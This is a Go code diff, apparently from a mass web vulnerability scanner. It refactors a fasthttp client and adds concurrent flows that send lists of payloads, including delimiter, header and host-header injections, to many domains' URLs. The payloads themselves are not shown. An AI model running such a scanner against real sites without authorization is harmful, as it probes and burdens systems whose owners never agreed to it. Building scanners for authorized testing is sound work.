+		ReadTimeout:         10 * time.Second,
+		WriteTimeout:        10 * time.Second,
+		MaxIdleConnDuration: 10 * time.Second,
+		MaxConnDuration:     30 * time.Second,
 		MaxConnsPerHost:     20,
-		MaxConnWaitTimeout:  4 * time.Second,
+		MaxConnWaitTimeout:  10 * time.Second,
 		ReadBufferSize:      128 * 1024,
 		WriteBufferSize:     16 * 1024,
-		MaxResponseBodySize: 0,
+		MaxResponseBodySize: 10 * 1024 * 1024, // 10MB max response size
 		RetryIf: func(req *fasthttp.Request) bool {
-			return false
+			return false // Disable retries
 		},
 		DialDualStack: false,
 		Dial: func(addr string) (net.Conn, error) {
@@ -886,8 +1523,8 @@ func main() {
 			}
 
 			dialer := &net.Dialer{
-				Timeout:   2 * time.Second,
-				KeepAlive: 10 * time.Second,
+				Timeout:   5 * time.Second, // Reduced from 10s
+				KeepAlive: 30 * time.Second,
 				DualStack: false,
 			}
 
@@ -898,8 +1535,13 @@ func main() {
 
 			tcpConn := conn.(*net.TCPConn)
 			tcpConn.SetKeepAlive(true)
-			tcpConn.SetKeepAlivePeriod(10 * time.Second)
+			tcpConn.SetKeepAlivePeriod(30 * time.Second)
 			tcpConn.SetNoDelay(true)
+			tcpConn.SetReadBuffer(128 * 1024)
+			tcpConn.SetWriteBuffer(16 * 1024)
+
+			// Set read/write deadlines
+			tcpConn.SetDeadline(time.Now().Add(10 * time.Second))
 
 			return conn, nil
 		},
@@ -988,70 +1630,36 @@ func main() {
 
 	initStats()
 
-	for i, payload := range payloads {
-		printEssential("Testing payload %d of %d: '%s'", i+1, len(payloads), payload)
-
-		var domainWg sync.WaitGroup
-		domainSem := make(chan struct{}, *domainWorkers)
-
-		for domain, urls := range domainURLs {
-			if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 20 {
-				if *verbose {
-					printVerbose("Skipping domain %s due to too many timeouts", domain)
-				}
-				continue
-			}
-
-			if isDomainBlacklisted(domain) {
-				continue
-			}
-
-			domainSem <- struct{}{} // Acquire semaphore
-			domainWg.Add(1)
-			go func(domain string, urls []string) {
-				defer func() {
-					<-domainSem // Release semaphore
-					domainWg.Done()
-				}()
-
-				urlChan := make(chan string, len(urls))
-				var wg sync.WaitGroup
-
-				// Scale workers based on URL count
-				domainWorkers := 5 + (len(urls) / 100) // Base 5 workers + 1 per 100 URLs
-				if domainWorkers > 15 {
-					domainWorkers = 15 // Cap at 15
-				}
-
-				for i := 0; i < domainWorkers; i++ {
-					wg.Add(1)
-					go func() {
-						defer wg.Done()
-						for targetURL := range urlChan {
-							if _, found := skippedURLs.Load(targetURL); found {
-								continue
-							}
-
-							processURL(client, targetURL, payload)
-
-							time.Sleep(25 * time.Millisecond) // Reduced sleep time
-						}
-					}()
-				}
-
-				go func() {
-					for _, url := range urls {
-						urlChan <- url
-					}
-					close(urlChan)
-				}()
-
-				wg.Wait()
-			}(domain, urls)
+	if *normalFlow {
+		printEssential("Starting normal flow...")
+		for i, payload := range payloads {
+			printEssential("Testing payload %d of %d: '%s'", i+1, len(payloads), truncatePayload(payload))
+			runFlow(client, domainURLs, payload, false)
 		}
+	}
 
-		domainWg.Wait()
-		time.Sleep(50 * time.Millisecond) // Reduced from 100ms
+	if *delimiterFlow {
+		printEssential("Starting delimiter flow...")
+		for i, payload := range delimiterPayloads {
+			printEssential("Testing delimiter payload %d of %d: '%s'", i+1, len(delimiterPayloads), truncatePayload(payload))
+			runFlow(client, domainURLs, payload, true)
+		}
+	}
+
+	if *headerFlow {
+		printEssential("Starting header testing flow...")
+		for i, payload := range headerPayloads {
+			printEssential("Testing header payload %d of %d: '%s'", i+1, len(headerPayloads), truncatePayload(payload))
+			runHeaderFlow(client, domainURLs, payload)
+		}
+	}
+
+	if *hostHeaderFlow {
+		printEssential("Starting host header testing flow...")
+		for i, payload := range hostHeaderPayloads {
+			printEssential("Testing host header payload %d of %d: '%s'", i+1, len(hostHeaderPayloads), truncatePayload(payload))
+			runHostHeaderFlow(client, domainURLs, payload)
+		}
 	}
 
 	if *showStats {
@@ -1059,4 +1667,198 @@ func main() {
 	}
 
 	client.CloseIdleConnections()
+}
+
+func runFlow(client *fasthttp.Client, domainURLs map[string][]string, payload string, isDirectoryFlow bool) {
+	var domainWg sync.WaitGroup
+	domainSem := make(chan struct{}, *domainWorkers)
+
+	for domain, urls := range domainURLs {
+		if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 20 {
+			if *verbose {
+				printVerbose("Skipping domain %s due to too many timeouts", domain)
+			}
+			continue
+		}
+
+		if isDomainBlacklisted(domain) {
+			continue
+		}
+
+		domainSem <- struct{}{} // Acquire semaphore
+		domainWg.Add(1)
+		go func(domain string, urls []string) {
+			defer func() {
+				<-domainSem // Release semaphore
+				domainWg.Done()
+			}()
+
+			urlChan := make(chan string, len(urls))
+			var wg sync.WaitGroup
+
+			// Scale workers based on URL count
+			domainWorkers := 5 + (len(urls) / 100) // Base 5 workers + 1 per 100 URLs
+			if domainWorkers > 15 {
+				domainWorkers = 15 // Cap at 15
+			}
+
+			for i := 0; i < domainWorkers; i++ {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					for targetURL := range urlChan {
+						if _, found := skippedURLs.Load(targetURL); found {
+							continue
+						}
+
+						if isDirectoryFlow {
+							processDelimiter(client, targetURL, payload)
+						} else {
+							processURL(client, targetURL, payload)
+						}
+
+						time.Sleep(25 * time.Millisecond)
+					}
+				}()
+			}
+
+			go func() {
+				for _, url := range urls {
+					urlChan <- url
+				}
+				close(urlChan)
+			}()
+
+			wg.Wait()
+		}(domain, urls)
+	}
+
+	domainWg.Wait()
+	time.Sleep(50 * time.Millisecond)
+}
+
+func runHeaderFlow(client *fasthttp.Client, domainURLs map[string][]string, payload string) {
+	var domainWg sync.WaitGroup
+	domainSem := make(chan struct{}, *domainWorkers)
+
+	for domain, urls := range domainURLs {
+		if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 20 {
+			if *verbose {
+				printVerbose("Skipping domain %s due to too many timeouts", domain)
+			}
+			continue
+		}
+
+		if isDomainBlacklisted(domain) {
+			continue
+		}
+
+		domainSem <- struct{}{} // Acquire semaphore
+		domainWg.Add(1)
+		go func(domain string, urls []string) {
+			defer func() {
+				<-domainSem // Release semaphore
+				domainWg.Done()
+			}()
+
+			urlChan := make(chan string, len(urls))
+			var wg sync.WaitGroup
+
+			// Scale workers based on URL count
+			domainWorkers := 5 + (len(urls) / 100) // Base 5 workers + 1 per 100 URLs
+			if domainWorkers > 15 {
+				domainWorkers = 15 // Cap at 15
+			}
+
+			for i := 0; i < domainWorkers; i++ {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					for targetURL := range urlChan {
+						if _, found := skippedURLs.Load(targetURL); found {
+							continue
+						}
+
+						processHeader(client, targetURL, payload)
+						time.Sleep(25 * time.Millisecond)
+					}
+				}()
+			}
+
+			go func() {
+				for _, url := range urls {
+					urlChan <- url
+				}
+				close(urlChan)
+			}()
+
+			wg.Wait()
+		}(domain, urls)
+	}
+
+	domainWg.Wait()
+	time.Sleep(50 * time.Millisecond)
+}
+
+func runHostHeaderFlow(client *fasthttp.Client, domainURLs map[string][]string, payload string) {
+	var domainWg sync.WaitGroup
+	domainSem := make(chan struct{}, *domainWorkers)
+
+	for domain, urls := range domainURLs {
+		if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 20 {
+			if *verbose {
+				printVerbose("Skipping domain %s due to too many timeouts", domain)
+			}
+			continue
+		}
+
+		if isDomainBlacklisted(domain) {
+			continue
+		}
+
+		domainSem <- struct{}{} // Acquire semaphore
+		domainWg.Add(1)
+		go func(domain string, urls []string) {
+			defer func() {
+				<-domainSem // Release semaphore
+				domainWg.Done()
+			}()
+
+			urlChan := make(chan string, len(urls))
+			var wg sync.WaitGroup
+
+			// Scale workers based on URL count
+			domainWorkers := 5 + (len(urls) / 100) // Base 5 workers + 1 per 100 URLs
+			if domainWorkers > 15 {
+				domainWorkers = 15 // Cap at 15
+			}
+
+			for i := 0; i < domainWorkers; i++ {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					for targetURL := range urlChan {
+						if _, found := skippedURLs.Load(targetURL); found {
+							continue
+						}
+
+						processHostHeader(client, targetURL, payload)
+						time.Sleep(25 * time.Millisecond)
+					}
+				}()
+			}
+
+			go func() {
+				for _, url := range urls {
+					urlChan <- url
+				}
+				close(urlChan)
+			}()
+
+			wg.Wait()
+		}(domain, urls)
+	}
+
+	domainWg.Wait()
+	time.Sleep(50 * time.Millisecond)
 }
